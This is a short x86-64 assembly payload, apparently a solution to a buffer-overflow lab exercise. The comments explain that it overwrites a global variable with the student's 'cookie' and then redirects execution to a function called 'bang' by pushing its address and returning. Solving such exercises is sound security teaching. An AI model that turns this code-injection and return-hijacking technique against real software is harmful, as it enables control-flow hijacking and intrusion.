movq $0x602308, %rax #put the address of global value into rax
movq $0x4d79ae8c49bfa368, %rsi
movq %rsi, (%rax) #change the global value to be my cookie
pushq $0x401020 #return address to bang
retq
